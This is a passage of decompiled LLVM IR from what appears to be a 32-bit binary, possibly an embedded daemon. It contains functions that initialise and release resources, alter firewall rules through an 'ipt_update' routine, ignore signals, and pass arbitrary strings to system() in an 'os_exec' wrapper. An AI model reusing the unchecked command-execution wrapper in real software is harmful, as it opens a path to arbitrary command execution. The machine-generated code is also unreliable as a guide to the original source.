  %v3_404a64 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32 -32600) to i32*), align 4
  store i32 %v3_404a64, i32* %v1.global-to-local, align 4
  %v1_404a70 = mul i32 %storemerge38, 4
  %v2_404a74 = add i32 %v3_404a64, %v1_404a70
  %v1_404a78 = inttoptr i32 %v2_404a74 to i32*
  %v2_404a78 = load i32, i32* %v1_404a78, align 4
  store i32 %v2_404a78, i32* %v1.global-to-local, align 4
  %v2_404a84 = load i32, i32* %v1_404a84, align 4
  %v2_404ad0 = call i32 @llvm.bswap.i32(i32 %v2_404a84)
  %v2_404ae0 = icmp eq i32 %v2_404a78, %v2_404ad0
  %.stack_var_-80.1 = select i1 %v2_404ae0, i8 1, i8 %stack_var_-80.17
  %v1_404af8 = add nuw nsw i32 %storemerge38, 1
  %v1_404b08 = icmp slt i32 %v1_404af8, 5
  %v1_404b0c = icmp eq i1 %v1_404b08, false
  br i1 %v1_404b0c, label %dec_label_pc_404b2c, label %dec_label_pc_404b10

dec_label_pc_404b10:                              ; preds = %dec_label_pc_404a38, %dec_label_pc_404a64
  %storemerge38 = phi i32 [ 0, %dec_label_pc_404a38 ], [ %v1_404af8, %dec_label_pc_404a64 ]
  %stack_var_-80.17 = phi i8 [ 0, %dec_label_pc_404a38 ], [ %.stack_var_-80.1, %dec_label_pc_404a64 ]
  %v1_404b24 = icmp eq i8 %stack_var_-80.17, 1
  br i1 %v1_404b24, label %dec_label_pc_404b2c, label %dec_label_pc_404a64

dec_label_pc_404b2c:                              ; preds = %dec_label_pc_404b10, %dec_label_pc_404a64
  %stack_var_-80.1.lcssa = phi i8 [ %stack_var_-80.17, %dec_label_pc_404b10 ], [ %.stack_var_-80.1, %dec_label_pc_404a64 ]
  %v1_404b3c = icmp eq i8 %stack_var_-80.1.lcssa, 1
  br i1 %v1_404b3c, label %dec_label_pc_404c18, label %dec_label_pc_404bec.preheader

dec_label_pc_404bec.preheader:                    ; preds = %dec_label_pc_404b2c
  br label %dec_label_pc_404bfc

dec_label_pc_404b50:                              ; preds = %dec_label_pc_404bfc
  %v3_404b50 = load i32, i32* bitcast (i32** @global_var_41b19c.101 to i32*), align 4
  store i32 %v3_404b50, i32* %v1.global-to-local, align 4
  %v1_404b5c = mul i32 %storemerge26, 8
  %v2_404b60 = add i32 %v3_404b50, %v1_404b5c
  %v1_404b64 = inttoptr i32 %v2_404b60 to i32*
  %v2_404b64 = load i32, i32* %v1_404b64, align 4
  store i32 %v2_404b64, i32* %v1.global-to-local, align 4
  %v2_404b70 = load i32, i32* %v1_404a84, align 4
  %v2_404bbc = call i32 @llvm.bswap.i32(i32 %v2_404b70)
  %v2_404bcc = icmp eq i32 %v2_404b64, %v2_404bbc
  %.stack_var_-80.3 = select i1 %v2_404bcc, i8 1, i8 %stack_var_-80.35
  %v1_404be4 = add nuw nsw i32 %storemerge26, 1
  %v1_404bf4 = icmp slt i32 %v1_404be4, 100
  %v1_404bf8 = icmp eq i1 %v1_404bf4, false
  br i1 %v1_404bf8, label %dec_label_pc_404c18, label %dec_label_pc_404bfc

dec_label_pc_404bfc:                              ; preds = %dec_label_pc_404bec.preheader, %dec_label_pc_404b50
  %storemerge26 = phi i32 [ 0, %dec_label_pc_404bec.preheader ], [ %v1_404be4, %dec_label_pc_404b50 ]
  %stack_var_-80.35 = phi i8 [ %stack_var_-80.1.lcssa, %dec_label_pc_404bec.preheader ], [ %.stack_var_-80.3, %dec_label_pc_404b50 ]
  %v1_404c10 = icmp eq i8 %stack_var_-80.35, 1
  br i1 %v1_404c10, label %dec_label_pc_404c18, label %dec_label_pc_404b50

dec_label_pc_404c18:                              ; preds = %dec_label_pc_404bfc, %dec_label_pc_404b50, %dec_label_pc_404b2c
  %stack_var_-80.4 = phi i8 [ %stack_var_-80.1.lcssa, %dec_label_pc_404b2c ], [ %stack_var_-80.35, %dec_label_pc_404bfc ], [ %.stack_var_-80.3, %dec_label_pc_404b50 ]
  %v4_404c18 = zext i8 %stack_var_-80.4 to i32
  %v1_404c20 = xor i32 %v4_404c18, 1
  %v1_404c28 = icmp eq i32 %v1_404c20, 0
  br i1 %v1_404c28, label %dec_label_pc_404c38, label %dec_label_pc_404f00

dec_label_pc_404c38:                              ; preds = %dec_label_pc_404c18
  %v0_404c64 = load i32, i32* %v1.global-to-local, align 4
  %v5_404c64 = trunc i32 %v0_404c64 to i8
  %v1_404c7c = icmp eq i8 %v5_404c64, 0
  br i1 %v1_404c7c, label %dec_label_pc_404f00, label %dec_label_pc_404c8c

dec_label_pc_404c8c:                              ; preds = %dec_label_pc_404c38
  %v1_404c94 = add i32 %v3_404a44, 8
  %v2_404c94 = inttoptr i32 %v1_404c94 to i32*
  %v3_404c94 = load i32, i32* %v2_404c94, align 4
  %v2_404ce0 = call i32 @llvm.bswap.i32(i32 %v3_404c94)
  store i32 %v2_404ce0, i32* %v1.global-to-local, align 4
  %v2_404cf4 = icmp ult i32 %v2_404ce0, 102401
  %v3_404cf4 = zext i1 %v2_404cf4 to i32
  %v1_404cf8 = icmp eq i1 %v2_404cf4, false
  br i1 %v1_404cf8, label %dec_label_pc_404f00, label %dec_label_pc_404cfc

dec_label_pc_404cfc:                              ; preds = %dec_label_pc_404c8c
  %v3_404d50 = load i32, i32* @global_var_41b36c.91, align 4
  %v1_404d58 = icmp eq i32 %v3_404d50, 0
  br label %dec_label_pc_404d4c

dec_label_pc_404d4c:                              ; preds = %dec_label_pc_404d4c, %dec_label_pc_404cfc
  br i1 %v1_404d58, label %dec_label_pc_404d5c, label %dec_label_pc_404d4c

dec_label_pc_404d5c:                              ; preds = %dec_label_pc_404d4c
  %v6_404d7c = call i32* @memcpy(i32* nonnull @global_var_41b358.104, i32* %v1_404a84, i32 20)
  %v2_404d90 = load i32, i32* %v1_404a84, align 4
  %v2_404ddc = call i32 @llvm.bswap.i32(i32 %v2_404d90)
  store i32 %v2_404ddc, i32* %v1.global-to-local, align 4
  store i32 %v2_404ddc, i32* @global_var_41b358.104, align 4
  %v1_404df8 = add i32 %v3_404a44, 4
  %v2_404df8 = inttoptr i32 %v1_404df8 to i32*
  %v3_404df8 = load i32, i32* %v2_404df8, align 4
  %v2_404e44 = call i32 @llvm.bswap.i32(i32 %v3_404df8)
  store i32 %v2_404e44, i32* %v1.global-to-local, align 4
  store i32 %v2_404e44, i32* @global_var_41b35c.105, align 4
  %v3_404e64 = load i32, i32* %v2_404c94, align 4
  %v2_404eb0 = call i32 @llvm.bswap.i32(i32 %v3_404e64)
  store i32 %v2_404eb0, i32* @global_var_41b360.106, align 4
  store i32 ptrtoint (i32* @global_var_41b358.104 to i32), i32* %v1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_41b358.104 to i32), i32* @global_var_41b36c.91, align 4
  %v3_404ee8 = load i32, i32* @global_var_41b1a4.107, align 4
  br label %dec_label_pc_404f00

dec_label_pc_404f00:                              ; preds = %dec_label_pc_404c38, %dec_label_pc_404c18, %dec_label_pc_404c8c, %dec_label_pc_4049fc, %dec_label_pc_404d5c
  %v1_404f10 = phi i32 [ %v0_404c64, %dec_label_pc_404c38 ], [ %v1_404c20, %dec_label_pc_404c18 ], [ %v3_404cf4, %dec_label_pc_404c8c ], [ %v2_404a30, %dec_label_pc_4049fc ], [ %v3_404ee8, %dec_label_pc_404d5c ]
  ret i32 %v1_404f10

; uselistorder directives
  uselistorder i32 %v2_404e44, { 1, 0 }
  uselistorder i32 %v2_404ddc, { 1, 0 }
  uselistorder i32 %v2_404ce0, { 1, 0 }
  uselistorder i8 %stack_var_-80.35, { 1, 0, 2 }
  uselistorder i32 %v1_404be4, { 1, 0 }
  uselistorder i8 %stack_var_-80.1.lcssa, { 2, 1, 0 }
  uselistorder i8 %stack_var_-80.17, { 2, 0, 1 }
  uselistorder i32 %v1_404af8, { 1, 0 }
  uselistorder i32* %v1_404a84, { 1, 0, 2, 3 }
  uselistorder i32 %v3_404a44, { 1, 2, 0 }
  uselistorder i32* %v1.global-to-local, { 4, 5, 6, 7, 0, 1, 8, 2, 9, 3 }
  uselistorder i32* @global_var_41b36c.91, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_404f00, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_404bfc, { 1, 0 }
  uselistorder label %dec_label_pc_404b10, { 1, 0 }
}

define i32 @function_404f18() local_unnamed_addr {
dec_label_pc_404f18:
  %v3_404f34 = load i32, i32* @global_var_41b1a8.108, align 4
  store i32 %v3_404f34, i32* @global_var_41b354.102, align 4
  %v1_404f64 = icmp eq i32 %v3_404f34, 0
  br i1 %v1_404f64, label %dec_label_pc_404f68, label %dec_label_pc_404f78

dec_label_pc_404f68:                              ; preds = %dec_label_pc_404f18
  br label %dec_label_pc_40502c

dec_label_pc_404f78:                              ; preds = %dec_label_pc_404f18
  %v3_404f8c = load i32, i32* @global_var_41b180.77, align 4
  store i32 %v3_404f8c, i32* @global_var_41b350.109, align 4
  %v1_404fbc = icmp eq i32 %v3_404f8c, 0
  br i1 %v1_404fbc, label %dec_label_pc_404fc0, label %dec_label_pc_405000

dec_label_pc_404fc0:                              ; preds = %dec_label_pc_404f78
  store i32 0, i32* @global_var_41b354.102, align 4
  br label %dec_label_pc_40502c

dec_label_pc_405000:                              ; preds = %dec_label_pc_404f78
  %v5_40501c = call i32* @memset(i32* nonnull @global_var_41b358.104, i32 0, i32 20)
  br label %dec_label_pc_40502c

dec_label_pc_40502c:                              ; preds = %dec_label_pc_404fc0, %dec_label_pc_404f68, %dec_label_pc_405000
  %v1_40503c = phi i32 [ 0, %dec_label_pc_404fc0 ], [ 0, %dec_label_pc_404f68 ], [ 1, %dec_label_pc_405000 ]
  ret i32 %v1_40503c

; uselistorder directives
  uselistorder i32* @global_var_41b358.104, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_40502c, { 2, 0, 1 }
}

define i32 @function_405044() local_unnamed_addr {
dec_label_pc_405044:
  %v3_405064 = load i32, i32* @global_var_41b350.109, align 4
  %v1_40506c = icmp eq i32 %v3_405064, 0
  br i1 %v1_40506c, label %dec_label_pc_4050a4, label %dec_label_pc_405070

dec_label_pc_405070:                              ; preds = %dec_label_pc_405044
  store i32 0, i32* @global_var_41b350.109, align 4
  br label %dec_label_pc_4050a4

dec_label_pc_4050a4:                              ; preds = %dec_label_pc_405044, %dec_label_pc_405070
  %v3_4050a8 = load i32, i32* @global_var_41b354.102, align 4
  %v1_4050b0 = icmp eq i32 %v3_4050a8, 0
  br i1 %v1_4050b0, label %dec_label_pc_4050e8, label %dec_label_pc_4050b4

dec_label_pc_4050b4:                              ; preds = %dec_label_pc_4050a4
  store i32 0, i32* @global_var_41b354.102, align 4
  br label %dec_label_pc_4050e8

dec_label_pc_4050e8:                              ; preds = %dec_label_pc_4050a4, %dec_label_pc_4050b4
  %v1_4050f8 = phi i32 [ 0, %dec_label_pc_4050a4 ], [ ptrtoint (i32* @global_var_420000.2 to i32), %dec_label_pc_4050b4 ]
  ret i32 %v1_4050f8

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_420000.2 to i32), { 0, 1, 3, 4, 7, 2, 6, 5 }
  uselistorder label %dec_label_pc_4050e8, { 1, 0 }
  uselistorder label %dec_label_pc_4050a4, { 1, 0 }
}

define i32 @mm_alloc(i32 %arg1) local_unnamed_addr {
entry:
  %v2_405130 = call i32* @malloc(i32 %arg1)
  %v3_405130 = ptrtoint i32* %v2_405130 to i32
  ret i32 %v3_405130
}

define i32 @function_405154(i32* %arg1) local_unnamed_addr {
dec_label_pc_405154:
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_40517c = icmp eq i32* %arg1, null
  br i1 %v1_40517c, label %dec_label_pc_4051a8, label %dec_label_pc_40518c

dec_label_pc_40518c:                              ; preds = %dec_label_pc_405154
  call void @free(i32* nonnull %arg1)
  br label %dec_label_pc_4051a8

dec_label_pc_4051a8:                              ; preds = %dec_label_pc_405154, %dec_label_pc_40518c
  %v1_4051b8 = phi i32 [ %tmp, %dec_label_pc_405154 ], [ ptrtoint (i32* @0 to i32), %dec_label_pc_40518c ]
  ret i32 %v1_4051b8

; uselistorder directives
  uselistorder label %dec_label_pc_4051a8, { 1, 0 }
}

define i32 @os_init() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v2_4051c0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_4051c0, i32* @fp, align 4
  %v0_4051dc = call i32 @mtx_create()
  store i32 %v0_4051dc, i32* @global_var_434370.113, align 4
  %v1_405200 = icmp eq i32 %v0_4051dc, 0
  br i1 %v1_405200, label %dec_label_pc_405204, label %dec_label_pc_405214

dec_label_pc_405204:                              ; preds = %entry
  br label %dec_label_pc_405374

dec_label_pc_405214:                              ; preds = %entry
  %v0_405214 = call i32 @function_406858()
  store i32 %v0_405214, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_430000.84 to i32), i32 17268) to i32*), align 4
  %v1_405238 = icmp eq i32 %v0_405214, 0
  br i1 %v1_405238, label %dec_label_pc_40523c, label %dec_label_pc_405270

dec_label_pc_40523c:                              ; preds = %dec_label_pc_405214
  %v3_405244 = load i32, i32* @global_var_434370.113, align 4
  %v1_405250 = inttoptr i32 %v3_405244 to i32*
  %v2_405250 = call i32 @mtx_destroy(i32* %v1_405250)
  store i32 0, i32* @global_var_434370.113, align 4
  br label %dec_label_pc_405374

dec_label_pc_405270:                              ; preds = %dec_label_pc_405214
  %v2_405278 = call i32 @function_405c18(i32 0, i32 0)
  %v2_405284 = ptrtoint i32* %stack_var_-12 to i32
  %v3_405290 = call i32 @function_405acc(i32* null, i32 %v2_405284)
  %v1_40529c = icmp eq i32 %v3_405290, 0
  br i1 %v1_40529c, label %dec_label_pc_4052f8, label %dec_label_pc_4052e0.preheader

dec_label_pc_4052e0.preheader:                    ; preds = %dec_label_pc_405270
  %v3_4052e44 = load i32, i32* %stack_var_-12, align 4
  %v2_4052ec5 = icmp ugt i32 %v3_4052e44, 3
  br i1 %v2_4052ec5, label %dec_label_pc_4052b4, label %dec_label_pc_4052f8

dec_label_pc_4052b4:                              ; preds = %dec_label_pc_4052e0.preheader, %dec_label_pc_4052b4
  %storemerge27 = phi i32 [ %v1_4052d8, %dec_label_pc_4052b4 ], [ 3, %dec_label_pc_4052e0.preheader ]
  %v2_4052c4 = call i32 @close(i32 %storemerge27)
  %v1_4052d8 = add i32 %storemerge27, 1
  %v3_4052e4 = load i32, i32* %stack_var_-12, align 4
  %v2_4052ec = icmp ult i32 %v1_4052d8, %v3_4052e4
  br i1 %v2_4052ec, label %dec_label_pc_4052b4, label %dec_label_pc_4052f8

dec_label_pc_4052f8:                              ; preds = %dec_label_pc_4052b4, %dec_label_pc_4052e0.preheader, %dec_label_pc_405270
  %v3_405300 = call i32 @function_405e14(i8* null, i32 0)
  br label %dec_label_pc_405318

dec_label_pc_405318:                              ; preds = %dec_label_pc_4052f8, %dec_label_pc_405318
  %storemerge3 = phi i32 [ 0, %dec_label_pc_4052f8 ], [ %v1_405354, %dec_label_pc_405318 ]
  %v1_405324 = mul i32 %storemerge3, 4
  %v2_40532c = add i32 %v1_405324, ptrtoint ([8 x i8*]* @global_var_41b0d0.123 to i32)
  %v1_405330 = inttoptr i32 %v2_40532c to i32*
  %v2_405330 = load i32, i32* %v1_405330, align 4
  %v4_405340 = call i32 @ipt_update(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_40a8ec.124, i32 0, i32 0), i32 %v2_405330)
  %v1_405354 = add nuw nsw i32 %storemerge3, 1
  %v1_405364 = icmp slt i32 %v1_405354, 8
  br i1 %v1_405364, label %dec_label_pc_405318, label %dec_label_pc_40536c

dec_label_pc_40536c:                              ; preds = %dec_label_pc_405318
  br label %dec_label_pc_405374

dec_label_pc_405374:                              ; preds = %dec_label_pc_40523c, %dec_label_pc_405204, %dec_label_pc_40536c
  %v1_405384 = phi i32 [ 0, %dec_label_pc_40523c ], [ 0, %dec_label_pc_405204 ], [ 1, %dec_label_pc_40536c ]
  ret i32 %v1_405384

; uselistorder directives
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v1_4052d8, { 1, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0, 2 }
  uselistorder label %dec_label_pc_405374, { 2, 0, 1 }
  uselistorder label %dec_label_pc_405318, { 1, 0 }
  uselistorder label %dec_label_pc_4052b4, { 1, 0 }
}

define i32 @os_release() local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %v2_40538c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_40538c, i32* @fp, align 4
  br label %dec_label_pc_4053b4

dec_label_pc_4053b4:                              ; preds = %entry, %dec_label_pc_4053b4
  %storemerge27 = phi i32 [ 0, %entry ], [ %v1_4053ec, %dec_label_pc_4053b4 ]
  %v1_4053c0 = mul i32 %storemerge27, 4
  %v2_4053c8 = add i32 %v1_4053c0, ptrtoint ([8 x i8*]* @global_var_41b0d0.123 to i32)
  %v1_4053cc = inttoptr i32 %v2_4053c8 to i32*
  %v2_4053cc = load i32, i32* %v1_4053cc, align 4
  %v4_4053dc = call i32 @ipt_update(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_40a8f4.125, i32 0, i32 0), i32 %v2_4053cc)
  %v1_4053ec = add nuw nsw i32 %storemerge27, 1
  %v1_4053fc = icmp slt i32 %v1_4053ec, 8
  br i1 %v1_4053fc, label %dec_label_pc_4053b4, label %dec_label_pc_405404

dec_label_pc_405404:                              ; preds = %dec_label_pc_4053b4
  %v3_40540c = load i8*, i8** @global_var_434378.126, align 4
  %v4_4054483 = ptrtoint i8* %v3_40540c to i32
  %v1_4054504 = icmp eq i8* %v3_40540c, null
  br i1 %v1_4054504, label %dec_label_pc_40548c, label %dec_label_pc_405454

dec_label_pc_40543c:                              ; preds = %dec_label_pc_405454, %dec_label_pc_405480
  %v5_405444 = inttoptr i32 %v2_405460 to i8*
  %v1_405450 = icmp eq i32 %v2_405460, 0
  br i1 %v1_405450, label %dec_label_pc_40548c, label %dec_label_pc_405454

dec_label_pc_405454:                              ; preds = %dec_label_pc_405404, %dec_label_pc_40543c
  %v4_4054486 = phi i32 [ %v2_405460, %dec_label_pc_40543c ], [ %v4_4054483, %dec_label_pc_405404 ]
  %storemerge5 = phi i8* [ %v5_405444, %dec_label_pc_40543c ], [ %v3_40540c, %dec_label_pc_405404 ]
  %v1_405460 = bitcast i8* %storemerge5 to i32*
  %v2_405460 = load i32, i32* %v1_405460, align 4
  %v1_405474 = add i32 %v4_4054486, 4
  %v2_405474 = inttoptr i32 %v1_405474 to i8*
  %v3_405474 = load i8, i8* %v2_405474, align 1
  %v2_40547c = icmp eq i8 %v3_405474, 84
  br i1 %v2_40547c, label %dec_label_pc_405480, label %dec_label_pc_40543c

dec_label_pc_405480:                              ; preds = %dec_label_pc_405454
  %v1_405428 = add i32 %v4_4054486, 8
  %v2_405428 = inttoptr i32 %v1_405428 to i32*
  %v3_405428 = load i32, i32* %v2_405428, align 4
  %v1_405434 = inttoptr i32 %v3_405428 to i32*
  %v2_405434 = call i32 @th_cancel(i32* %v1_405434)
  br label %dec_label_pc_40543c

dec_label_pc_40548c:                              ; preds = %dec_label_pc_40543c, %dec_label_pc_405404
  %v3_405490 = load i32, i32* @global_var_434370.113, align 4
  %v1_405498 = icmp eq i32 %v3_405490, 0
  br i1 %v1_405498, label %dec_label_pc_4054c0, label %dec_label_pc_40549c

dec_label_pc_40549c:                              ; preds = %dec_label_pc_40548c
  %v1_4054b0 = inttoptr i32 %v3_405490 to i32*
  %v2_4054b0 = call i32 @mtx_destroy(i32* %v1_4054b0)
  store i32 0, i32* @global_var_434370.113, align 4
  br label %dec_label_pc_4054c0

dec_label_pc_4054c0:                              ; preds = %dec_label_pc_40548c, %dec_label_pc_40549c
  %v3_4054c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_430000.84 to i32), i32 17268) to i32*), align 4
  %v1_4054cc = icmp eq i32 %v3_4054c4, 0
  br i1 %v1_4054cc, label %dec_label_pc_4054f4, label %dec_label_pc_4054d0

dec_label_pc_4054d0:                              ; preds = %dec_label_pc_4054c0
  %v3_4054d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_430000.84 to i32), i32 17268) to i32*), align 4
  %v1_4054e4 = call i32 @function_4068f8(i32 %v3_4054d8)
  store i32 0, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_430000.84 to i32), i32 17268) to i32*), align 4
  br label %dec_label_pc_4054f4

dec_label_pc_4054f4:                              ; preds = %dec_label_pc_4054c0, %dec_label_pc_4054d0
  %v1_405504 = phi i32 [ 0, %dec_label_pc_4054c0 ], [ ptrtoint (i32* @global_var_430000.84 to i32), %dec_label_pc_4054d0 ]
  ret i32 %v1_405504

; uselistorder directives
  uselistorder i32 %v2_405460, { 2, 1, 0 }
  uselistorder i32 %v4_4054486, { 1, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder label %dec_label_pc_4054f4, { 1, 0 }
  uselistorder label %dec_label_pc_4054c0, { 1, 0 }
  uselistorder label %dec_label_pc_405454, { 1, 0 }
  uselistorder label %dec_label_pc_40543c, { 1, 0 }
  uselistorder label %dec_label_pc_4053b4, { 1, 0 }
}

define i32 @os_reboot() local_unnamed_addr {
entry:
  %v4_40553c = call i32 @system(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_40a8fc.127, i32 0, i32 0))
  ret i32 %v4_40553c
}

define i32 @os_exec(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i8*, align 4
  %v0_405568 = load i32, i32* @fp, align 4
  store i8* %arg1, i8** %stack_var_0, align 4
  %v3_40558c = load i32, i32* @global_var_434370.113, align 4
  %v1_405594 = icmp eq i32 %v3_40558c, 0
  br i1 %v1_405594, label %dec_label_pc_4055b8, label %dec_label_pc_405598

dec_label_pc_405598:                              ; preds = %entry
  %v1_4055ac = inttoptr i32 %v3_40558c to i32*
  %v2_4055ac = call i32 @mtx_lock(i32* %v1_4055ac)
  %v3_4055b8.pre = load i8*, i8** %stack_var_0, align 4
  br label %dec_label_pc_4055b8

dec_label_pc_4055b8:                              ; preds = %entry, %dec_label_pc_405598
  %v3_4055b8 = phi i8* [ %arg1, %entry ], [ %v3_4055b8.pre, %dec_label_pc_405598 ]
  %v4_4055c8 = call i32 @system(i8* %v3_4055b8)
  %v3_4055dc = load i32, i32* @global_var_434370.113, align 4
  %v1_4055e4 = icmp eq i32 %v3_4055dc, 0
  br i1 %v1_4055e4, label %dec_label_pc_405608, label %dec_label_pc_4055e8

dec_label_pc_4055e8:                              ; preds = %dec_label_pc_4055b8
  %v1_4055fc = inttoptr i32 %v3_4055dc to i32*
  %v2_4055fc = call i32 @mtx_unlock(i32* %v1_4055fc)
  br label %dec_label_pc_405608

dec_label_pc_405608:                              ; preds = %dec_label_pc_4055b8, %dec_label_pc_4055e8
  store i32 %v0_405568, i32* @fp, align 4
  ret i32 %v4_4055c8

; uselistorder directives
  uselistorder i32 (i8*)* @system, { 1, 0 }
  uselistorder label %dec_label_pc_405608, { 1, 0 }
  uselistorder label %dec_label_pc_4055b8, { 1, 0 }
}

define i32 @sig_handle(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  switch i32 %arg1, label %dec_label_pc_4056e8 [
    i32 1, label %dec_label_pc_40568c
    i32 2, label %dec_label_pc_40569c
    i32 6, label %dec_label_pc_4056ac
    i32 13, label %dec_label_pc_4056bc
    i32 15, label %dec_label_pc_4056cc
    i32 17, label %dec_label_pc_4056dc
  ]

dec_label_pc_40568c:                              ; preds = %entry
  br label %dec_label_pc_4056f4

dec_label_pc_40569c:                              ; preds = %entry
  br label %dec_label_pc_4056f4

dec_label_pc_4056ac:                              ; preds = %entry
  br label %dec_label_pc_4056f4

dec_label_pc_4056bc:                              ; preds = %entry
  br label %dec_label_pc_4056f4

dec_label_pc_4056cc:                              ; preds = %entry
  br label %dec_label_pc_4056f4

dec_label_pc_4056dc:                              ; preds = %entry
  br label %dec_label_pc_4056f4

dec_label_pc_4056e8:                              ; preds = %entry
  br label %dec_label_pc_40575c

dec_label_pc_4056f4:                              ; preds = %dec_label_pc_4056dc, %dec_label_pc_4056cc, %dec_label_pc_4056bc, %dec_label_pc_4056ac, %dec_label_pc_40569c, %dec_label_pc_40568c
  %stack_var_-40.0.ph = phi i32 [ 1, %dec_label_pc_40568c ], [ 2, %dec_label_pc_40569c ], [ 6, %dec_label_pc_4056ac ], [ 13, %dec_label_pc_4056bc ], [ 15, %dec_label_pc_4056cc ], [ 18, %dec_label_pc_4056dc ]
  %v5_405714 = call i32* @memset(i32* nonnull %stack_var_-36, i32 0, i32 28)
  store i32 268435456, i32* %stack_var_-36, align 4
  %tmp12 = bitcast i32* %stack_var_-36 to %sigaction*
  %v8_405750 = call i32 @sigaction(i32 %stack_var_-40.0.ph, %sigaction* %tmp12, %sigaction* null)
  br label %dec_label_pc_40575c

dec_label_pc_40575c:                              ; preds = %dec_label_pc_4056e8, %dec_label_pc_4056f4
  %v1_40576c = phi i32 [ -1, %dec_label_pc_4056e8 ], [ %v8_405750, %dec_label_pc_4056f4 ]
  ret i32 %v1_40576c

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 1, 2, 0 }
  uselistorder label %dec_label_pc_40575c, { 1, 0 }
}

define i32 @function_405774(i32 %arg1) local_unnamed_addr {
dec_label_pc_405774:
  switch i32 %arg1, label %dec_label_pc_405834 [
    i32 1, label %dec_label_pc_4057d8
    i32 2, label %dec_label_pc_4057e8
    i32 6, label %dec_label_pc_4057f8
    i32 13, label %dec_label_pc_405808
    i32 15, label %dec_label_pc_405818
    i32 17, label %dec_label_pc_405828
  ]

dec_label_pc_4057d8:                              ; preds = %dec_label_pc_405774
  br label %dec_label_pc_40584c

dec_label_pc_4057e8:                              ; preds = %dec_label_pc_405774
  br label %dec_label_pc_40584c

dec_label_pc_4057f8:                              ; preds = %dec_label_pc_405774
  br label %dec_label_pc_40584c

dec_label_pc_405808:                              ; preds = %dec_label_pc_405774
  br label %dec_label_pc_40584c

dec_label_pc_405818:                              ; preds = %dec_label_pc_405774
  br label %dec_label_pc_40584c

dec_label_pc_405828:                              ; preds = %dec_label_pc_405774
  br label %dec_label_pc_40584c

dec_label_pc_405834:                              ; preds = %dec_label_pc_405774
  br label %dec_label_pc_40586c

dec_label_pc_40584c:                              ; preds = %dec_label_pc_405828, %dec_label_pc_405818, %dec_label_pc_405808, %dec_label_pc_4057f8, %dec_label_pc_4057e8, %dec_label_pc_4057d8
  %stack_var_-16.0.ph = phi i32 [ 1, %dec_label_pc_4057d8 ], [ 2, %dec_label_pc_4057e8 ], [ 6, %dec_label_pc_4057f8 ], [ 13, %dec_label_pc_405808 ], [ 15, %dec_label_pc_405818 ], [ 18, %dec_label_pc_405828 ]
  %v5_405860 = call void (i32)* @signal(i32 %stack_var_-16.0.ph, void (i32)* inttoptr (i32 1 to void (i32)*))
  %v7_405860 = ptrtoint void (i32)* %v5_405860 to i32
  br label %dec_label_pc_40586c

dec_label_pc_40586c:                              ; preds = %dec_label_pc_405834, %dec_label_pc_40584c
  %v1_40587c = phi i32 [ -1, %dec_label_pc_405834 ], [ %v7_405860, %dec_label_pc_40584c ]
  ret i32 %v1_40587c

; uselistorder directives
  uselistorder label %dec_label_pc_40586c, { 1, 0 }
}

define i32 @function_405884(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_405884:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  store i32 %tmp, i32* %stack_var_0, align 4
  %v1_4058b4 = icmp eq i32* %arg1, null
  %v1_4058b8 = zext i1 %v1_4058b4 to i8
  %v1_4058c4 = icmp eq i32 %arg2, 0
  %v1_4058c8 = zext i1 %v1_4058c4 to i8
  %v3_4058d0 = load i32, i32* @global_var_434370.113, align 4
  %v1_4058dc = inttoptr i32 %v3_4058d0 to i32*
  %v2_4058dc = call i32 @mtx_lock(i32* %v1_4058dc)
  %v7_405904 = call %_IO_FILE* @fopen(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_40a994.133, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_40a9a4.134, i32 0, i32 0))
  %v1_40591c = icmp eq %_IO_FILE* %v7_405904, null
  br i1 %v1_40591c, label %dec_label_pc_405a60, label %dec_label_pc_4059e4.preheader

dec_label_pc_4059e4.preheader:                    ; preds = %dec_label_pc_405884
  %tmp20 = bitcast i32* %stack_var_-264 to i8*
  %v8_4059c0 = inttoptr i32 %arg2 to i32*
  br label %dec_label_pc_4059e4.outer

dec_label_pc_40592c:                              ; preds = %dec_label_pc_405a14
  br i1 %v1_4059f4, label %dec_label_pc_405988, label %dec_label_pc_405940

dec_label_pc_405940:                              ; preds = %dec_label_pc_40592c
  %v3_405954 = load i32, i32* %stack_var_0, align 4
  %v8_405964 = inttoptr i32 %v3_405954 to i32*
  %v9_405964 = call i32 (i8*, i8*, ...) @sscanf(i8* %tmp20, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_40a9a8.135, i32 0, i32 0), i32* %v8_405964)
  %v2_405978 = icmp eq i32 %v9_405964, 1
  %.stack_var_-272.1 = select i1 %v2_405978, i8 1, i8 %stack_var_-272.1
  br label %dec_label_pc_405988

dec_label_pc_405988:                              ; preds = %dec_label_pc_405940, %dec_label_pc_40592c
